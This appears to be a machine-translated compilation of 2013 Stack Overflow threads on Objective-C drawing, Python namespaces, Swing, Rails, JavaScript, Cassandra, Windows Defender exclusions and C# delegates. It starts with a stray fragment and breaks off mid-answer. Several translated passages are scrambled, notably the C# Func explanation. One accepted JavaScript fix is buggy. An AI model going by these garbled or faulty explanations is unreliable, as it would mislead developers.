
9 更高。请再猜一猜...

10**

# objective-c - UIBezierPath 多行颜色

> ID：14903572
> 
> 赞同：6
> 
> 时间：2013-02-15T21:25:52.123
> 
> 标签：objective-c, nsmutablearray, nsarray, uibezierpath

我尝试用不同颜色绘制 UIBezierPath 线失败了。所有线条都变为当前选定的颜色。我所有的路径和信息都存储在一个名为 pathInfo 的 NSMutableArray 中。在路径信息中，我放入包含路径、颜色、宽度和线类型的数组。这很好用，除了所有的线条都变成用户选择的任何颜色。我将不胜感激任何帮助！

```
- (void)drawRect:(CGRect)rect {
    UIBezierPath *drawPath = [UIBezierPath bezierPath];
    drawPath.lineCapStyle = kCGLineCapRound;
    drawPath.miterLimit = 0;

    for (int i = 0; i < [pathInfo count]; i++){
        NSArray *row = [[NSArray alloc] initWithArray:[pathInfo objectAtIndex:i]];
        NSLog(@"Path: %@",[row objectAtIndex:0]);
        NSLog(@"Color: %@",[row objectAtIndex:1]);
        NSLog(@"Width: %@",[row objectAtIndex:2]);
        NSLog(@"Type: %@",[row objectAtIndex:3]);

        //width
        drawPath.lineWidth = [[row objectAtIndex:2] floatValue];

        //color
        [[row objectAtIndex:1] setStroke];

        //path
        [drawPath appendPath:[row objectAtIndex:0]];

    }

   UIBezierPath *path = [self pathForCurrentLine];
    if (path)
     [drawPath appendPath:path];

   [drawPath stroke];
}

- (UIBezierPath*)pathForCurrentLine {
    if (CGPointEqualToPoint(startPoint, CGPointZero) && CGPointEqualToPoint(endPoint, CGPointZero)){
        return nil;
    }

    UIBezierPath *path = [UIBezierPath bezierPath];
    [path moveToPoint:startPoint];
    [path addLineToPoint:endPoint];

    return path;

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:35:16.477

笔触/填充颜色仅影响`-stroke`命令。它们不影响`-appendPath:`命令。路径不包含每段颜色信息。

如果您需要多色线条，则需要分别描边每种颜色。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T22:32:39.487

设置你的笔触颜色（以及你有什么），然后`stroke`，然后移动到下一条路径：

```
- (void)drawRect:(CGRect)rect
{
    for (int i = 0; i < [pathInfo count]; i++){
        NSArray *row = [[NSArray alloc] initWithArray:[pathInfo objectAtIndex:i]];

        NSLog(@"Path: %@",[row objectAtIndex:0]);
        NSLog(@"Color: %@",[row objectAtIndex:1]);
        NSLog(@"Width: %@",[row objectAtIndex:2]);
        NSLog(@"Type: %@",[row objectAtIndex:3]);

        UIBezierPath *path = [row objectAtIndex:0];

        path.lineCapStyle = kCGLineCapRound;
        path.miterLimit = 0;

        //width
        path.lineWidth = [[row objectAtIndex:2] floatValue];

        //color
        [[row objectAtIndex:1] setStroke];

        //path
        [path stroke];
    }

    UIBezierPath *path = [self pathForCurrentLine];
    if (path)
    {
        // set the width, color, etc, too, if you want
        [path stroke];
    }
} 
```

# iphone - 有没有办法使用`someButton.enabled = NO;`而不会使自定义图像UIButton变暗？

> ID：14903573
> 
> 赞同：1
> 
> 时间：2013-02-15T21:25:54.850
> 
> 标签：iphone, ios, objective-c, uibutton

有没有办法在`someButton.enabled = NO;`不使自定义图像变暗的情况下使用`UIButton`？

我希望它在没有启用 iOS = 无效的情况下更改图像。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:29:51.393

将禁用按钮的图像设置为启用按钮时的图像是一个问题：

```
UIImage* image=[button imageForState: UIControlStateNormal];
[button setImage: image forState: UIControlStateDisabled]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:30:35.380

见`-[UIButton setAdjustsImageWhenDisabled:]`。我相信它会做你正在寻找的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:29:52.370

当然。`Normal`您可以将状态和状态的按钮的“皮肤”设置为`Disabled`相同的图像：

```
UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
[btn setImage:[UIImage imageNamed:@"normalState"] forState:UIControlStateNormal];
[btn setImage:[UIImage imageNamed:@"normalState"] forState:UIControlStateDisabled]; 
```

# python - Easily dumping variables from/to namespaces/dictionaries in Python

> ID：14903576
> 
> 赞同：10
> 
> 时间：2013-02-15T21:26:05.877
> 
> 标签：python, dictionary, syntax, nested

Say I have several variables or objects in Python, `a`, `b`, `c`, ...

How can I easly *dump* these variables into a namespace in Python and restore them at a later time? (e.g. in the same way `argparse` wraps various variables into a namespace).

Here are two examples of how I would like to dump things to and from a namespace:

## Dumping local variables into a namespace

```
function (bar):
   # We start with a, b and c
   a = 10
   b = 20
   c = "hello world"

   # We can dump anything we want into e, by just passing things as arguments:
   e = dump_into_namespace(a, b, c) 
   del a, b, c

   print (e.a + e.b) # Prints 30
   return e  # We can return e if we want. This is just a use case scenario 
```

## Dumping local variables from a namespace e

```
# We start with e, which for example was built with a call to 
# dump_into_namespace(a,b,c) somewhere else in the program,
# in which case e would hold a, b and c 

# We may receive e through a function call or load it from disk, e.g.:

function foo(e):

   # The following call creates the variables a,b and c
   # or updates their values if the already exist in memory
   dump_from_namespace(e) 
   del e

   print(a + b) # Prints 30
   print(c) # Prints hello world 
```

My first question is: **Is this possible at all in Python?** (note that the method `dump_into_namespace` does not directly receive the names of the variables, at least as far as I can tell).

If the answer to the above is no, how could I do it with an interface like this?

```
e = dump_into_namespace('a', 'b', 'c') 
```

Also, how would this be done this with a **dictionary** instead of a **namespace**?

There are a few threads that seem relevant addressing a **dot-access** of dynamically-defined variables, but I don't think they address the problem of dumping variables:

### See also

*   [Python: Extract variables out of namespace](https://stackoverflow.com/questions/8306171/python-extract-variables-out-of-namespace-argparse)
*   [Picklable data containers that are dumpable in the current namespace](https://stackoverflow.com/questions/14716727/picklable-data-containers-that-are-dumpable-in-the-current-namespace)
*   [Recursive DotDict](https://stackoverflow.com/questions/13520421/recursive-dotdict)
*   [How to use a dot "." to access members of dictionary?](https://stackoverflow.com/questions/2352181/how-to-use-a-dot-to-access-members-of-dictionary)
*   [Javascript style dot notation for dictionary keys unpythonic?](https://stackoverflow.com/questions/224026/javascript-style-dot-notation-for-dictionary-keys-unpythonic)
*   [Accessing dict keys like an attribute?](https://stackoverflow.com/questions/4984647/accessing-dict-keys-like-an-attribute-in-python?lq=1)
*   [Recursively access dict via attributes as well as index access?](https://stackoverflow.com/questions/3031219/python-recursively-access-dict-via-attributes-as-well-as-index-access)
*   [Python: Easily access deeply nested dict (get and set)](https://stackoverflow.com/questions/3797957/python-easily-access-deeply-nested-dict-get-and-set?lq=1)
*   [Are there any 'gotchas' with this Python pattern?](https://stackoverflow.com/questions/5021041/are-there-any-gotchas-with-this-python-pattern?lq=1)

Are there any libraries that facilitate this type of access through dot notation?

### Update:

It looks like there is a library that supports dot-accessible dictionaries in Python, called [Bunch](http://pypi.python.org/pypi/bunch), but I am not sure it would support easily dumping as I defined it.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:44:56.177

下面的解决方案提供的语法非常接近您的要求，唯一的区别是您必须传递给显式定义变量的函数环境：

```
x = 10
y = 20

class dump_into_namespace:
    def __init__(self, env, *vars):
        self.vars = dict([(x, env[x]) for v in vars for x in env if v is env[x]])
    def __getattr__(self, name): return self.vars[name]

o = dump_into_namespace(locals(), x, y)
print o.x, o.y 
```

然后，您可以将变量“转储”回本地人（例如，在不同的函数中）：

```
>>> locals().update(o.vars)
>>> x
10 
```

## 编辑：

感谢 eyquem 的建议，这可以更短。想法是将变量放入`self.__dict__`“转储”对象中（注意：此处更新更改的语法）：

```
class dump_into_namespace:
    def __init__(self, env, *vs):
        vars(self).update(dict([(x, env[x]) for v in vs for x in env if v is env[x]]))

def f():
    x = 10
    y = 20
    return dump_into_namespace(locals(), x, y)

o = f() 
print o.x, o.y 
globals().update(vars(o))
print x 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-15T21:31:43.093

您有多种选择来创建您的“命名空间”。最简单的两个是：

*   创建一个快速的自定义类：

    ```
    class Namespace(object):
        def __init__(self, **kw):
            self.__dict__.update(kw)

    def dump_into_namespace(**kw):
        return Namespace(**kw) 
    ```

    `dump_into_namespace(a='a', b='b', c='c')`用;调用 这需要任意数量的关键字参数。

*   使用一个[`collections.namedtuple`类](http://docs.python.org/2/library/collections.html#collections.namedtuple)：

    ```
    from collections import namedtuple

    Namespace = namedtuple('Namespace', 'a b c')

    def dump_into_namespace(a, b, c):
        return Namespace(a, b, c) 
    ```

    `dump_into_namespace('a', 'b', 'c')`用;调用 这只需要固定数量的参数，但您的`dump_into_namespace()`函数可以提供默认值。

您所说的“点表示法”实际上只是属性访问。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-15T21:32:58.627

老实说，最简单的方法就是分配它们：

```
e.a = a
e.b = b
e.c = c 
```

你真的不能更动态地做它，因为一个变量不知道它自己的名字。您必须将它们作为关键字参数传递，在这种情况下，您可以直接更新命名空间`__dict__`：

```
def dump_into_namespace(e, **kwargs):
    e.__dict__.update(kwargs) 
```

你必须把它称为：

```
dump_into_namespace(e, a=a, b=b, c=c) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-15T22:07:38.560

编辑：

piokuc 的回答启发我考虑环境

我的解决方案更新**self._ *dict* _**以便无需定义特殊函数`__getattr__`：传递给函数的对象成为真正的属性，它们的名称属于创建对象的字典。

```
def dump_into_ns(env,*x):
    class A:
        def __init__(self,*y):
            vars(self).update((n,o) for n,o in env.items()
                              if o in y)
    return A(*x)

a = 19
b = 'Monday'
c = 'Wednesday'

def ftry(x,y):
    palat = 'obastey'
    a = x -1
    b = y +100
    c = x*y -8
    return dump_into_ns(locals(),a,b,c)

h = dump_into_ns(globals(),a,b,c)
print "h.__dict__ ==",h.__dict__
print '"a" in h.__dict__ ==',"a" in h.__dict__,"  h.a ==",h.a
print '"b" in h.__dict__ ==',"b" in h.__dict__,"  h.b ==",h.b
print '"c" in h.__dict__ ==',"c" in h.__dict__,"  h.c ==",h.c
print

e = ftry(20,50)
print "e.__dict__ ==",e.__dict__
print '"a" in e.__dict__ ==',"a" in e.__dict__,"  e.a ==",e.a
print '"b" in e.__dict__ ==',"b" in e.__dict__,"  e.b ==",e.b
print '"c" in e.__dict__ ==',"c" in e.__dict__,"  e.c ==",e.c
print

print 'h.a == e.a  : ',h.a==e.a
print 'h.b == e.b  : ',h.b==e.b
print 'h.c == e.c  : ',h.c==e.c 
```

结果

```
h.__dict__ == {'a': 19, 'c': 'Wednesday', 'b': 'Monday'}
"a" in h.__dict__ == True   h.a == 19
"b" in h.__dict__ == True   h.b == Monday
"c" in h.__dict__ == True   h.c == Wednesday

e.__dict__ == {'a': 19, 'c': 992, 'b': 150}
"a" in e.__dict__ == True   e.a == 19
"b" in e.__dict__ == True   e.b == 150
"c" in e.__dict__ == True   e.c == 992

h.a == e.a  :  True
h.b == e.b  :  False
h.c == e.c  :  False 
```

> 从某种意义上说，对象的属性集也形成了命名空间。
> 
> [http://docs.python.org/2/tutorial/classes.html](http://docs.python.org/2/tutorial/classes.html)

# java - 当线程完成/结束时在 Swing 中获取通知

> ID：14903583
> 
> 赞同：1
> 
> 时间：2013-02-15T21:26:33.007
> 
> 标签：java, multithreading, swing

看来我错过了 Java 和 Swing 中的某个点。问题如下：

*   我有一个带有开始/停止按钮的摆动 GUI（还有更多）
*   它启动函数（在这种情况下被设置为线程），线程启动，它工作，Swing GUI 完全可操作，并执行它所要做的所有其他事情，例如修改工作线程的参数。
*   当然，发送中断请求线程在用户请求时停止是在和函数中。到现在为止还挺好。

但我没有发现 Swing GUI 注意到线程自行停止的方法：如果我忽略它，它会使用户感到困惑。我当然放了一个循环，Swing GUI 会定期询问是否 Thread.isAlive（并且会睡一段时间再询问），但是这个循环完全阻塞了 Swing GUI。理想情况下，我想收到线程已停止的通知或事件。就像所有其他事件一样，Swing 进程:-) 。

设置它的正确方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:28:55.727

看看[SwingWorker](http://docs.oracle.com/javase/6/docs/api/javax/swing/SwingWorker.html)。它旨在作为 Swing 事件（如按钮按下）的结果在后台执行任务。当任务完成时，它有钩子来监听。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:57:22.827

使用布尔标志“完成”私有字段。初始化完成=假；当你的线程 run() 方法完成时，在线程 run() 方法中设置 done=true。监视“完成”标志的值将告诉您线程何时完成。

# ruby-on-rails - Why is application.html.erb being called on a js response?

> ID：14903587
> 
> 赞同：0
> 
> 时间：2013-02-15T21:27:07.763
> 
> 标签：ruby-on-rails, ruby-on-rails-3

In my Rails app I have a Ajax call to update a property:

```
def add_properties
    @conversation = Conversation.update(params[:conversationId], :points=> => params[:conversation][:points])

    respond_to do |format|
       format.js { render :partial => "add_properties" }
    end
end 
```

And my _add_properties.js.erb is simple:

```
$('#ajaxFeedback').html('Property updated').show().fadeOut(4000); 
```

What I am finding is that the call to the partial is choking due to some JQuery UI declarations in my application.html.erb. When I remove the declarations, all works well. How can I simply render the partial *without calling the application.html.erb*?

Any help would be appreciated!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T00:04:09.133

你有没有尝试过？

`format.js { render :layout => false, :partial => "add_properties" }`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:52:27.933

为什么不把它重命名为`add_properties.js.erb`

称呼

```
respond_to do |format|
  format.js
end 
```

# javascript - My javascript popup shows for a split second if there's a cookie

> ID：14903588
> 
> 赞同：0
> 
> 时间：2013-02-15T21:27:16.347
> 
> 标签：javascript, cookies, popup

I have no clue what I'm doing wrong. It works it just shows the popup for a split second. Would a timeout option be better? Which part is the problem? I'm a little new to Javascript so I don't really know what to exactly look for.

```
<script language="javascript" type="text/javascript">
/** Create a html cookie and set expiry as a day. **/
function createCookie(name,value,days) {
   var date = new Date();
   date.setTime(date.getTime()+(days*24*60*60*1000));
   var expires = date.toGMTString();
   document.cookie = name+"="+value+"; expires="+expires+"; path=/";
}
/** Check if already a cookie has been created. **/
function readCookie(name) {
    var flag = 0;
    var dcmntCookie = document.cookie.split(';');
    for(var i=0;i < dcmntCookie.length;i++) {
        var ck = dcmntCookie[i];
        while (ck.charAt(0)==' ') {
            ck = ck.substring(1,ck.length);
        }
        if(ck) {
            cparts = ck.split('=');
            if (cparts[0] == name) flag=1;
        }              
    }     
    if(flag) { 
        return true; 
    } else {
        return false; 
    }  
}
/** Check if cookie exists else create a new one. **/
function checkCookie(name) {
    if (readCookie(name)) {
        document.getElementById('google').style.display = "none";
        document.getElementById('google').style.visibility = "hidden";
    }
    else createCookie(name,"cookie 4 the day",1); 
}
</script>
<script type="text/javascript">

function closeThisDiv()

{

var openDiv = document.getElementById('google');

openDiv.style.display = 'none';

}
</script>
<body onLoad="checkCookie('MyCookie')" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:17:21.010

我这样修复它：

创建 display:none 的 css 属性；对于#google

```
#google{display:none;} 
```

然后切换代码的​​最后一部分以仅在他们没有 cookie 时显示，并创建 cookie。

```
/** Check if cookie exists else create a new one. **/
function checkCookie(name) {
    if (readCookie(name)) {

    }
    else document.getElementById('google').style.display = "inline";
         document.getElementById('google').style.visibility = "visibility";
         createCookie(name,"cookie 4 the day",1); 
```

万一有人遇到这个问题。对我来说效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:45:51.640

`id="google"`如果您的目标是从页面显示的一开始就隐藏元素（因此它永远不会显示），那么您应该添加一个 CSS 规则，该规则在 head 部分中加载，如下所示：

```
#google {display: none;} 
```

或者，您应该向 HTML 本身添加一个样式元素：

```
<div id="google" style="display:none"></div> 
```

* * *

由于您的代码当前正在编写，听起来它正在做它应该做的事情。它等待整个文档（包括图像）被加载，然后用`id="google"`. 这意味着该项目将在页面加载时短暂显示，然后您的代码将隐藏它。

如果您无法修改 google 对象的 CSS 或 HTML，而您只是想尽快使用 javascript 隐藏它，并且 google 对象存在于您页面的 HTML 中（未以编程方式添加），那么您可以这样做：

```
<body>
other HTML here

<script>
// script that executes right before the /body tag
checkCookie("MyCookie")
</script>

</body> 
```

这至少不会等待所有图像在隐藏之前加载。

# jquery - jQuery datepicker not initialized after partial inserted

> ID：14903592
> 
> 赞同：0
> 
> 时间：2013-02-15T21:27:32.757
> 
> 标签：jquery, jquery-plugins, ruby-on-rails-4

I have a rails 4 application that uses turbo links and jquery.turbolinks. It also uses the jQuery date picker plugin.

I am using Ryan Bates' technique for adding/editing multiple models in one form, from Railscast episode #196 Nested Model Form.

In my case, I am adding/editing people associated with a household. The person_fields partial includes a birthdate field that 'attempts' to use the date picker (a string input with class="datepicker"), but it doesn't work, the datepicker doesn't appear when I click on the field with a class of '.datepicker'.

With other forms that are loaded with the page, the datepicker works fine. But for this form that is added dynamically with this code, the datepicker doesn't appear.

Here's the code for the link that inserts the partial:

```
 def link_to_add_fields(name, f, association)
    new_object = f.object.send(association).klass.new
    id = new_object.object_id
    fields = f.fields_for(association, new_object, child_index: id) do |builder|
      render(association.to_s.singularize + "_fields", f: builder)
    end
  link_to(name, '#', class: "add_fields small round button success", data: {id: id, fields: fields.gsub("\n", "")})
 end 
```

And the coffee script for inserting the partial:

```
$('form').on 'click', '.add_fields', (event) ->
  time = new Date().getTime()
  regexp = new RegExp($(this).data('id'), 'g')
  $(this).before($(this).data('fields').replace(regexp, time))
  event.preventDefault() 
```

And the coffee script for the date picker:

```
$('.datepicker').datepicker() 
```

Any help is much appreciated.

--- UPDATE ---

Thanks to Billy Monk's suggestion, the code to add fields now looks like this:

```
$('form').on 'click', '.add_fields', (event) ->
  time = new Date().getTime()
  regexp = new RegExp($(this).data('id'), 'g')
  $(this).before($(this).data('fields').replace(regexp, time))
  event.preventDefault()
  $('.datepicker').datepicker() 
```

And it works! Much appreciated! Will accept the answer as soon as I'm allowed.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:36:45.490

在添加新字段的 JavaScript 函数中，在添加新字段后添加 $('.datepicker').datepicker()。日期选择器不会自动绑定到新添加的元素。

# javascript - javascript regex to require at least one special character

> ID：14903593
> 
> 赞同：2
> 
> 时间：2013-02-15T21:27:47.177
> 
> 标签：javascript, jquery, regex

I've seen plenty of regex examples that will not allow any special characters. I need one that requires at least one special character.

I'm looking at a C# regex

```
var regexItem = new Regex("^[a-zA-Z0-9 ]*$"); 
```

Can this be converted to use with javascript? Do I need to escape any of the characters?

Based an example I have built this so far:

```
var regex = "^[a-zA-Z0-9 ]*$";

//Must have one special character
if (regex.exec(resetPassword)) {
    isValid = false;
    $('#vsResetPassword').append('Password must contain at least 1 special character.');
} 
```

Can someone please identify my error, or guide me down a more efficient path? The error I'm currently getting is that regex has no 'exec' method

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:32:59.100

在 javascript 中，正则表达式的格式如下：

```
/^[a-zA-Z0-9 ]*$/ 
```

请注意，没有引号，而是在开头和结尾使用正斜杠。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T21:33:13.873

你的问题是这`"^[a-zA-Z0-9 ]*$"`是一个字符串，你需要一个正则表达式：

```
var regex = /^[a-zA-Z0-9 ]*$/;                 // one way
var regex = new RegExp("^[a-zA-Z0-9 ]*$");     // another way 
```

[[更多信息](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/RegExp)]

除此之外，您的代码看起来不错。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:35:37.800

在 javascript 中，您可以通过两种方式创建正则表达式对象。

1）您可以将构造函数方法与`RegExp`对象一起使用（注意与您使用的拼写不同）：

```
var regexItem = new RegExp("^[a-zA-Z0-9 ]*$"); 
```

2）您可以使用语言内置的文字语法：

```
var regexItem = /^[a-zA-Z0-9 ]*$/; 
```

第二种的优点是你只需要转义一个正斜杠，你不必担心引号。第一个的优点是您可以通过编程方式从各个部分构造一个字符串，然后将其传递给 RegExp 构造函数。

* * *

此外，正则表达式的可选标志以两种形式传递，如下所示：

```
var regexItem = new RegExp("^[A-Z0-9 ]*$", "i");
var regexItem = /^[A-Z0-9 ]*$/i; 
```

`/regex/`在 javascript 中，除非您动态构造字符串或标志，否则它似乎是内置于解析器中的用户方法的更常见约定。

# cassandra - Cassandra 1.2 using symbolic link for /var/lib/cassandra/data

> ID：14903597
> 
> 赞同：4
> 
> 时间：2013-02-15T21:28:00.307
> 
> 标签：cassandra

I thought this would be simple. I guess not.

I have an external hard drive mounted at `/root/storage` - OK
I moved the data directory from `/var/lib/cassandra/` to `/root/storage` - OK
I then created a symbolic link out of `/var/lib/cassandra` pointing to where the directory is now.....so...... `ln -s /root/storage/data /var/lib/cassandra` - OK

Now I am unable to start cassandra. I am getting this error in `/var/log/cassandra/system.log`:

> INFO [main] 2013-02-15 10:08:36,329 CacheService.java (line 166) Scheduling row cache save to each 0 seconds (going to save all keys).
> 
> ERROR [main] 2013-02-15 10:08:36,366 FileUtils.java (line 373) Stopping the gossiper and the RPC server ERROR [main] 2013-02-15 10:08:36,367 CassandraDaemon.java (line 387) Exception encountered during startup java.lang.IllegalStateException: No configured daemon at org.apache.cassandra.service.StorageService.stopRPCServer(StorageService.java:314) at org.apache.cassandra.io.util.FileUtils.handleFSError(FileUtils.java:375) at org.apache.cassandra.db.Directories.(Directories.java:113) at org.apache.cassandra.db.Directories.create(Directories.java:91) at org.apache.cassandra.db.ColumnFamilyStore.scrubDataDirectories(ColumnFamilyStore.java:403) at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:174) at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:370) at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:413) [root@cassandra-new6 storage]# vi /usr/share/cassandra/default.conf/cassandra.yaml

The permissions are exactly the same on this directory. All file permissiosn are teh same too. Any ideas would be appreciated.

When I get rid of the sym link and move the data directory back, everything works again.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-24T05:29:54.327

符号链接回归在 Cassandra 1.2.2 中已修复。[https://issues.apache.org/jira/browse/CASSANDRA-5185](https://issues.apache.org/jira/browse/CASSANDRA-5185)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-16T10:13:27.260

您可以通过更改 data_file_directories 参数来更改 Cassandra 在 cassandra.yaml 文件中查找数据目录的位置，而不是创建符号链接。

# javascript - How to parse XML that is embedded in ASP page using jQuery

> ID：14903601
> 
> 赞同：1
> 
> 时间：2013-02-15T21:28:11.427
> 
> 标签：javascript, jquery, xml, asp-classic, xml-parsing

The asp classic page I'm fixing connects to SQL Server 2008 to get data that is formatted as XML. Initially it was because the previous developer was using the IE specific XML data islands and I'm trying to make everything browser neutral.

Here's the asp code:

```
<xml id=xml_serial><%
if Program = "HNS" then
    set rs = conSQL.Execute( "T-SQL_stored_procedure_name" & CStr(OrderID) )
    while not RS.Eof
        Response.Write RS(0).Value
        RS.MoveNext
    wend
    RS.Close
end if
%></xml> 
```

Here's how the HTML/XML looks after processed by the server:

```
<xml id=xml_serial>
    <file>
        <record>
            <serial>5265951</serial>
            <altserial>B10005265951AC</altserial>
            <price>$ 120.00</price>
            <serial1name>Serial #</serial1name>
            <serial2name>Serial</serial2name>
        </record>
    </file>
</xml> 
```

I've used JQuery's xmlparser before but that was with a either an external file that could load the XML into a variable named xml that could be parsed with the parser.

The problem I'm having or don't understand is how to get the embedded xml into a variable for the JQuery parser to have something to parse? Is there some way to refer the id "xml_serial" that the parser can then point to and then parse the data?

I'm sure there is a way to do this, but I can't seem to find any examples that don't first point to an external xml file that is loaded into the xml variable prior to parsing.

Any help on this would be greatly appreciated. Thanks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T03:38:24.023

如果您正在谈论使用[http://api.jquery.com/jQuery.parseXML/](http://api.jquery.com/jQuery.parseXML/)上的 xml，您将在其中替换

```
var xml = "<rss version='2.0'><channel><title>RSS Title</title></channel></rss>", 
```

和

```
var xml=<%=MyXML%>, 
```

但首先您必须更改代码以构建 xml。

```
<%
MyXML=""
if Program = "HNS" then
    set rs = conSQL.Execute( "T-SQL_stored_procedure_name" & CStr(OrderID) )
    while not RS.Eof
        MyXML=MyXML& RS(0).Value  ' instead of response.write
        RS.MoveNext
    wend
    RS.Close
end if
%> 
```

# windows-8 - 在安装时向 Windows Defender 添加例外

> ID：14903606
> 
> 赞同：2
> 
> 时间：2013-02-15T21:28:47.793
> 
> 标签：windows-8, installshield

在 Windows 8 上运行时，我们的应用程序异常缓慢，除非我们在 Windows Defender 中为其添加进程异常。（它主要来自将操作记录到磁盘上。）

有没有办法在我们的 InstallShield 安装过程中以编程方式添加异常？在 C# 或 VBScript 中调用自定义操作很好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2021-11-17T10:29:17.177

实际上，我认为您正在寻找[Add-MpPreference](https://docs.microsoft.com/en-us/powershell/module/defender/add-mppreference)。

您的应用程序可能很慢，因为您触摸了很多文件，并且您触摸的每个文件都会被防御者扫描。我两次使用此 Powershell 命令，以在安装期间排除 exe (-ExclusionProcess) 和文件 (-ExclusionPath)。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-07-10T18:29:39.933

如果使用 VBScript 脚本向 Windows Defender 添加例外是如此容易，那么 Windows Defender 将无法保护您的计算机，因为任何恶意软件都会简单地为自己添加例外。

有一些注册表项可以定义是否启用了 Windows Defender 的实时保护。您可以阅读这些值以了解它是否处于活动状态并提醒您的用户缓慢是由 Windows Defender 引起的。但是您不能修改这些密钥，甚至不能在具有 SYSTEM 用户的服务中运行。这些注册表项受 Windows 保护以禁止篡改。

请注意，自 Windows 10 起，向 Windows Defender 添加例外的选项不再存在。

打开或关闭 Windows Defender 的唯一方法：

*   通过 Windows Defender 配置面板手动 (MsAscUi.exe)
*   安装另一个自动禁用 Windows Defender 的防病毒程序。

如果您对注册表项感兴趣，请阅读我在另一个问题中的回答：

*[确定 Windows Defender 磁盘扫描是否正在运行？](https://stackoverflow.com/questions/862776/find-out-if-windows-defender-disc-scan-is-running/31306480#31306480)*

# javascript - 如何将事件绑定到主干中动态创建的“el”？

> ID：14903607
> 
> 赞同：2
> 
> 时间：2013-02-15T21:28:48.520
> 
> 标签：javascript, backbone.js, bind

我在使用主干将事件绑定到动态创建的元素时遇到了一些麻烦。

这是生成元素的主干视图的代码。('.modal')

```
var MakeModalView = Backbone.View.extend({
      el: '#btn-make-modal',

    events: {
        'click': 'makeModal'
    },

    makeModal: function () {
        $('body').html('<div class="modal"><div class="modal-close">&times;</div>Close me! I\'m a modal!</div>');
    }
});
new MakeModalView(); 
```

这是控制动态创建的元素的视图：

```
var ModalView = Backbone.View.extend({
    el: '.modal',

    events: {
        'click .modal-close': 'closeModal'
    },

    closeModal: function () {
        this.$el.remove();
    }
});
new ModalView(); 
```

我遇到的问题是控制动态创建的元素（ModalView）的视图没有将事件绑定到该动态元素。('.modal')

**如何将元素绑定到主干中动态创建的“el”？**

我查看了以下解决方案：

[骨干动态创建的“el”不绑定事件](https://stackoverflow.com/questions/8452544/backbone-dynamically-created-el-not-binding-events)

[如何使用动态创建的“el”创建主干视图？](https://stackoverflow.com/questions/10142451/how-do-you-create-backbone-views-with-an-el-that-was-dynamically-created)

但我似乎仍然无法弄清楚如何将事件附加到动态元素。

我创建了一个小提琴来演示这种行为是如何工作的。[http://jsfiddle.net/6wzzk/3/](http://jsfiddle.net/6wzzk/3/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:58:40.720

当您实例化 Backbone.View 时，Backbone 会尝试获取它`el`并进行事件订阅（委托）。因此，如果`el`不在 DOM 中，则事件不会触发。

在您的情况下，因为您正在使用该`makeModal`方法创建模型，所以只需将`ModalView`创建移到那里：

```
makeModal: function () {
    $('body').html('<div class="modal"><div class="modal-close">&times;</div>');
    new ModalView();
} 
```

更新[了 JSFiddle](http://jsfiddle.net/6wzzk/4/)。

无论如何，创建`ModalView`应该是`MakeModalView`责任，并且在`makeModal`方法中这样做听起来是正确的地方。

# c# - 调用函数 在拉姆达

> ID：14903613
> 
> 赞同：0
> 
> 时间：2013-02-15T21:28:57.347
> 
> 标签：c#

我很困惑，为什么我不能将其称为函数，我该如何让自己将其称为函数？

```
Error   1   'fn' is a 'variable' but is used like a 'method' 
```

来源

```
Func<List<object>, List<object>, Func<string, object>> test;
test = (ls, fn) => fn(null); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-15T21:33:57.500

> 我很困惑。

是的。让我们为您解惑。

> 这有什么问题？

```
Func<List<object>, List<object>, Func<string, object>> test;
test = (ls, fn) => fn(null); 
```

这表示这`test`是一个函数，它接受两个列表并将函数从字符串返回到对象。列表是`ls`和`fn`。所以`fn`is的类型`List<object>`，这不是可以调用的东西。

也许您应该在此处描述您要执行的操作，因为从代码中根本不清楚。

> 它假设收到 a`List<object>`并`Func<string, object>`返回`List<object>`

我认为这是不对的，因为你想*调用*那个函数并得到一个`List<object>`返回，但是 a`Func<string, object>`返回一个`object`.

也许你打算写的是

```
Func<List<object>, Func<string, List<object>>, List<object>> test;
test = (ls, fn) => fn(null); 
```

现在is的类型和`ls`is`List<object>`的类型。因此，当被调用时，它将按照.`fn``Func<string, List<object>>``fn``List<object>``test`

有道理？

请记住，在 中`Func<A, B, R>`，A 和 B 是参数类型，R 是返回类型。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-15T21:33:26.673

您可能想要以下内容

```
Func<List<object>, Func<string, List<object>>, List<object>> test; 
```

或者

```
Func<List<object>, Func<string, object>, object> test; 
```

为了这个工作

```
test = (ls, fn) => fn(null); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:36:00.977

您可能需要类似的东西：

```
 static void Main(string[] args)
    {
